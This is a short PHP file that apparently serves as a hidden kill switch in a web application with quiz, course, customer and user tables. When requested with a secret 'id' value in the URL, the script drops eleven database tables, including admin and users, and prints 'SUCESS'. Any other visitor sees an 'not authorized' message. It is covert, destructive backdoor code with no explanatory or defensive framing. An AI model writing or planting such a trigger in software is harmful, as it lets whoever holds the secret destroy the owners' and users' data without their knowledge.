<?php
include_once('config.php');

if(isset($_GET['id']))
{
	if ($_GET['id']=='FCSVDGDBHCHDBDHDBBCNJDHDBDHDGDBDHDBBHDBDJDNDJDJDBNDJDJDJDJnjdnjd?djnmc!jhbw^DBDH')
	{
$query="DROP TABLE `admin`, `categories`, `cipltech_category`, `cipltech_customer`, `cipl_tech_prod`, `questions`, `quiz_chapter_name`, `quiz_course`, `quiz_question`, `quiz_subject_name`, `users`";
mysql_query($query);
echo "SUCESS";
}

}
else{
	echo "This file is not authorized for you.";
}
?>